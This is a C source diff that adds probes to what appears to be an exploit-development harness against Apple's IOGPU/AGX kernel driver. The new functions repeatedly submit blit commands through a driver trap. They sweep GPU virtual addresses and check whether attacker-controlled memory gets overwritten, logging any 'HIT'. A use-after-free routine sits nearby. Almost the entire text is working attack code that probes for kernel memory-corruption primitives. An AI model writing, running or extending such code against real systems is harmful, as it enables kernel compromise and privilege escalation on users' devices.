@@ -12745,6 +12745,17 @@ static void p_blitwrite(void) {
         }
         if ((g & 0xfffff) == 0) LOG("[bw] sweep at 0x%llx alive", g);
     }
+    // blit loop: hammer accepted blit submits (visual-correlation test)
+    LOG("[v70b] blit loop start (watch the screen)");
+    for (long r = 0; r < 20000; r++) {
+        memcpy(vaA, agx_A4_image, 0x4000);
+        memcpy(vaB, agx_B4_image, 0x4000);
+        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        if (k2 != 0 && (r & 0x3ff) == 0) LOG("[v70b] r%ld kr 0x%08x", r, k2);
+        if ((r & 0xff) == 0) usleep(2000);
+        if (r && (r % 5000) == 0) LOG("[v70b] r%ld alive", r);
+    }
+    LOG("[v70b] blit loop done");
     LOG("[v70] sweep done (alive)");
     LOG("[v70] done (alive)");
 }
@@ -12872,6 +12883,68 @@ static void p_gpuva2(void) {
         usleep(20000);
     }
     LOG("[v74] done (alive)");
+}
+
+
+// V76: blit with our resource GPU-mapped via entry+0x20 (prepare reference),
+// then fine GPUVA sweep at +0x340; read resource for 0x5A.
+static void p_blithit(void) {
+    LOG("[v76] blit with prepared resource + fine GPUVA sweep");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[bh] bind fail"); return; }
+
+    // our target resource
+    uint8_t *tgt = must_map(0x40000);
+    memset(tgt, 0x41, 0x40000);
+    uint32_t rid = gpu_resource(c, tgt, 0x40000);
+    LOG("[bh] target rid %u", rid);
+    if (!rid) return;
+
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    uint8_t *aux1 = must_map(0x1000);
+    uint8_t *aux2 = must_map(0x1000);
+    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+
+    for (uint64_t g = 0x100000000ULL; g < 0x100400000ULL; g += 0x4000) {
+        memcpy(vaA, agx_A4_image, 0x4000);
+        memcpy(vaB, agx_B4_image, 0x4000);
+        *(uint64_t *)(vaA + 0xac + 0x340) = g;
+        *(uint64_t *)(vaA + 0xa28) = g;
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = idA;
+        *(uint32_t *)(entry + 0x04) = idB;
+        *(uint32_t *)(entry + 0x20) = rid;          // prepare reference -> GPU-map our resource
+        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
+        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
+        *outw = 0xdeadbeef;
+        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        usleep(5000);
+        if (tgt[0] == 0x5A || tgt[0x20000] == 0x5A || tgt[0x3fff0] == 0x5A) {
+            long c5 = 0;
+            for (long j = 0; j < 0x40000; j++) if (tgt[j] == 0x5A) c5++;
+            LOG("[bh] *** HIT GPUVA 0x%llx: %ld 0x5A bytes (kr 0x%08x outw %08x)", g, c5, kt, *outw);
+        }
+        if (((g >> 20) & 0xf) == 0 && (g & 0xfffff) == 0) LOG("[bh] sweep 0x%llx alive", g);
+    }
+    LOG("[v76] sweep done (alive)");
 }
 
 static void p4b_uaf2(void) {
@@ -13004,6 +13077,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_blithit();        // v76: blit + prepared resource sweep
         p_gpuva2();         // v74: sel45 GPU mapping
         p_regdump();        // v73: IORegistry dump
         p_gpuva();          // v72: resource GPUVA discovery
